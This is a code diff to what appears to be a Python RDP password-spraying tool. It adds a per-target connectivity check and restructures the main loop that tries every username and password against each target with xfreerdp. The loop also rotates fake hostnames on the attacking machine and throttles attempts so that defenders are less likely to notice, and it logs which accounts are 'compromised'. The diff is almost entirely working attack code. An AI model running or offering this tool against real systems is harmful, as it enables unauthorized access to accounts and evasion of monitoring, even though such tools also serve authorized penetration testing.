@@ -29,7 +29,7 @@ def args_parse():
     pass_group.add_argument('-p', '--password', help="Single password to use")
     pass_group.add_argument('-P', '--passwordlist',
                             help="Password list to use, one password per line")
-    target_group.add_argument('-T', '--targets', help="Targets list to use, one target per line")
+    target_group.add_argument('-T', '--targetlist', help="Targets list to use, one target per line")
     target_group.add_argument('-t', '--target', help="Target machine to authenticate against")
     sleep_group.add_argument('-s', '--sleep', type=int,
                              help="Throttle the attempts to one attempt every # seconds, "
@@ -170,98 +170,114 @@ def attempts(users, passes, targets, domain, output_file_name, hostnames_strippe
             "[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
         output('Status', 'Username', 'Password', 'Target', output_file_name)
         for target in targets:
-            for password in passes:
-                for username in users:
-                    subprocess.call(
-                        "hostnamectl set-hostname '%s'" % hostnames_stripped[
-                            attempts_hostname_counter],
-                        shell=True)
-                    spray = subprocess.Popen(
-                        "xfreerdp /v:'%s' +auth-only /d:%s /u:%s /p:%s /sec:nla /cert-ignore" % (
-                            target, domain, username, password), stdout=subprocess.PIPE,
-                        stderr=subprocess.PIPE, shell=True)
-                    output_error = spray.stderr.read()
-                    output_info = spray.stdout.read()
-                    # throttling requests
-                    if random is True:
-                        sleep_time = random_time(min_sleep, max_sleep)
-                        time.sleep(float(sleep_time))
-                    else:
-                        time.sleep(float(sleep_time))
-                    if any(word in output_error for word in failed_to_conn_to_server):
-                        LOGGER.error(
-                            "[-] Failed to establish connection, check target RDP availability.")
-                        LOGGER.info('[*] Resetting to the original hostname')
-                        subprocess.call("hostnamectl set-hostname '%s'" % orighostname, shell=True)
-                        exit(1)
-                    elif any(word in output_error for word in failed_login):
-                        status = 'Invalid'
-                        if verbose:
-                            output(status, username, password, target, output_file_name)
-                        LOGGER.debug("[-]Creds failed for: " + username)
-                    elif account_locked in output_error:
-                        status = 'Locked'
-                        output(status, username, password, target, output_file_name)
-                        LOGGER.warning("[!] Account locked: " + username)
-                        answer = locked_input('%s is Locked, do you wish to resume? (will '
-                                              'auto-continue without answer)' % username, 'Y/n',
-                                              'y').lower()
-                        if answer == 'n':
-                            LOGGER.error("Stopping the tool")
+            test_RDP = subprocess.Popen("xfreerdp /v:'%s' +auth-only /d:%s /u:%s /p:%s" "/sec:nla"
+                                        " /cert-ignore" % (target, domain, "SOCtest",
+                                                           "AllLegitHere"), stdout=subprocess.PIPE,
+                                        stderr=subprocess.PIPE, shell=True)
+            test_RDP_error = test_RDP.stderr.read()
+            if any(word in test_RDP_error for word in failed_to_conn_to_server):
+                LOGGER.error(
+                    "[-] Failed to establish connection, check %s RDP availability." %
+                    target)
+                LOGGER.info('[*] Resetting to the original hostname')
+                subprocess.call("hostnamectl set-hostname '%s'" % orighostname, shell=True)
+            else:
+                for password in passes:
+                    for username in users:
+                        subprocess.call(
+                            "hostnamectl set-hostname '%s'" % hostnames_stripped[
+                                attempts_hostname_counter],
+                            shell=True)
+                        spray = subprocess.Popen(
+                            "xfreerdp /v:'%s' +auth-only /d:%s /u:%s /p:%s /sec:nla /cert-ignore" %
+                            (target, domain, username, password), stdout=subprocess.PIPE,
+                            stderr=subprocess.PIPE, shell=True)
+                        output_error = spray.stderr.read()
+                        output_info = spray.stdout.read()
+                        # throttling requests
+                        if random is True:
+                            sleep_time = random_time(min_sleep, max_sleep)
+                            time.sleep(float(sleep_time))
+                        else:
+                            time.sleep(float(sleep_time))
+                        if any(word in output_error for word in failed_to_conn_to_server):
+                            LOGGER.error(
+                                "[-] Failed to establish connection, check %s RDP availability." %
+                                target)
                             LOGGER.info('[*] Resetting to the original hostname')
                             subprocess.call("hostnamectl set-hostname '%s'" % orighostname,
                                             shell=True)
-                            exit(1)
-                    elif account_disabled in output_error:
-                        status = 'Disabled'
-                        output(status, username, password, target, output_file_name)
-                        working_creds_counter += 1
-                        LOGGER.warning(
-                            "[*] Creds valid, but account disabled: " + username + " :: "
-                            + password)
-                    elif any(word in output_error for word in pass_expired):
-                        status = 'Password Expired'
-                        output(status, username, password, target, output_file_name)
-                        working_creds_counter += 1
-                        LOGGER.warning(
-                            "[*] Creds valid, but pass expired: " + username + " :: " + password)
-                    elif account_expired in output_error:
-                        status = 'Account expired'
-                        output(status, username, password, target, output_file_name)
-                        working_creds_counter += 1
-                        LOGGER.warning(
-                            "[*] Creds valid, but account expired: " + username + " :: " + password)
-                    elif any(word in output_error for word in success_login_no_rdp):
-                        status = 'Valid creds WITHOUT RDP access'
-                        output(status, username, password, target, output_file_name)
-                        working_creds_counter += 1
-                        LOGGER.info(
-                            "[+] Seems like the creds are valid, but no RDP permissions: "
-                            + username + " :: " + password)
-                    elif success_login_yes_rdp in output_error:
-                        status = 'Valid creds WITH RDP access (maybe even local admin!)'
-                        output(status, username, password, target, output_file_name)
-                        working_creds_counter += 1
-                        LOGGER.info(
-                            "[+] Cred successful (maybe even Admin access!): " + username + " :: " +
-                            password)
-                    else:
-                        status = 'Unknown status, check the log file'
-                        output(status, username, password, target, output_file_name)
-                        with open(output_file_name + ".log", mode='a') as log_file2:
-                            creds_writer = csv.writer(log_file2, delimiter=',', quotechar='"')
-                            creds_writer.writerow(
-                                ['Unknown status, check the csv file', username,
-                                 output_error + output_info])
-                        LOGGER.error("[-]Unknown error for %s: on:%s | %s %s", username, target,
-                                     output_error,
-                                     str(output_info))
+                            # exit(1)
+                        elif any(word in output_error for word in failed_login):
+                            status = 'Invalid'
+                            if verbose:
+                                output(status, username, password, target, output_file_name)
+                            LOGGER.debug("[-]Creds failed for: " + username)
+                        elif account_locked in output_error:
+                            status = 'Locked'
+                            output(status, username, password, target, output_file_name)
+                            LOGGER.warning("[!] Account locked: " + username)
+                            answer = locked_input('%s is Locked, do you wish to resume? (will '
+                                                  'auto-continue without answer)' % username, 'Y/n',
+                                                  'y').lower()
+                            if answer == 'n':
+                                LOGGER.error("Stopping the tool")
+                                LOGGER.info('[*] Resetting to the original hostname')
+                                subprocess.call("hostnamectl set-hostname '%s'" % orighostname,
+                                                shell=True)
+                                exit(1)
+                        elif account_disabled in output_error:
+                            status = 'Disabled'
+                            output(status, username, password, target, output_file_name)
+                            working_creds_counter += 1
+                            LOGGER.warning(
+                                "[*] Creds valid, but account disabled: " + username + " :: "
+                                + password)
+                        elif any(word in output_error for word in pass_expired):
+                            status = 'Password Expired'
+                            output(status, username, password, target, output_file_name)
+                            working_creds_counter += 1
+                            LOGGER.warning(
+                                "[*] Creds valid, but pass expired: " + username + " :: " +
+                                password)
+                        elif account_expired in output_error:
+                            status = 'Account expired'
+                            output(status, username, password, target, output_file_name)
+                            working_creds_counter += 1
+                            LOGGER.warning(
+                                "[*] Creds valid, but account expired: " + username + " :: "
+                                + password)
+                        elif any(word in output_error for word in success_login_no_rdp):
+                            status = 'Valid creds WITHOUT RDP access'
+                            output(status, username, password, target, output_file_name)
+                            working_creds_counter += 1
+                            LOGGER.info(
+                                "[+] Seems like the creds are valid, but no RDP permissions: "
+                                + username + " :: " + password)
+                        elif success_login_yes_rdp in output_error:
+                            status = 'Valid creds WITH RDP access (maybe even local admin!)'
+                            output(status, username, password, target, output_file_name)
+                            working_creds_counter += 1
+                            LOGGER.info(
+                                "[+] Cred successful (maybe even Admin access!): " + username +
+                                " :: " + password)
+                        else:
+                            status = 'Unknown status, check the log file'
+                            output(status, username, password, target, output_file_name)
+                            with open(output_file_name + ".log", mode='a') as log_file2:
+                                creds_writer = csv.writer(log_file2, delimiter=',', quotechar='"')
+                                creds_writer.writerow(
+                                    ['Unknown status, check the csv file', username,
+                                     output_error + output_info])
+                            LOGGER.error("[-]Unknown error for %s: on:%s | %s %s", username, target,
+                                         output_error,
+                                         str(output_info))
 
-                    # going over different fake hostnames
-                    if attempts_hostname_counter < hostname_loop:
-                        attempts_hostname_counter += 1
-                    else:
-                        attempts_hostname_counter = 0
+                        # going over different fake hostnames
+                        if attempts_hostname_counter < hostname_loop:
+                            attempts_hostname_counter += 1
+                        else:
+                            attempts_hostname_counter = 0
 
         LOGGER.info("[*] Overall compromised accounts: %s" % working_creds_counter)
         LOGGER.info(
@@ -353,7 +369,7 @@ def main():
             exception(err)
     elif args.targetlist:
         try:
-            targets_stripped = targetlist(args.targetslist)
+            targets_stripped = targetlist(args.targetlist)
         except Exception as err:
             exception(err)
     if args.random:
